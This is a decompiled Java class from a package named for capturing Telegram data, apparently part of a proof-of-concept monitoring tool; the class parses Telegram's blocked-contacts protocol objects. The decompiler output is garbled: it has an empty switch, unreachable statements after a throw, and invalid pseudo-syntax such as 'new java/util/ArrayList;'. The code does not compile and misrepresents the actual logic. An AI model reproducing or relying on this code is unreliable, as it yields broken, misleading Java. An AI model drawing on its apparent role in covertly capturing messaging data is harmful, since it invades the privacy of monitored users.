package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$contacts_Blocked
  extends TLObject
{
  public ArrayList blocked;
  public int count;
  public ArrayList users;
  
  public TLRPC$contacts_Blocked()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.blocked = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.users = localArrayList;
  }
  
  public static contacts_Blocked TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    while ((localObject == null) && (paramBoolean))
    {
      localObject = new java/lang/RuntimeException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      String str = String.format("can't parse magic %x in contacts_Blocked", arrayOfObject);
      ((RuntimeException)localObject).<init>(str);
      throw ((Throwable)localObject);
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_contacts_blocked;
      ((TLRPC.TL_contacts_blocked)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_contacts_blockedSlice;
      ((TLRPC.TL_contacts_blockedSlice)localObject).<init>();
    }
    if (localObject != null) {
      ((contacts_Blocked)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
    return (contacts_Blocked)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$contacts_Blocked.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */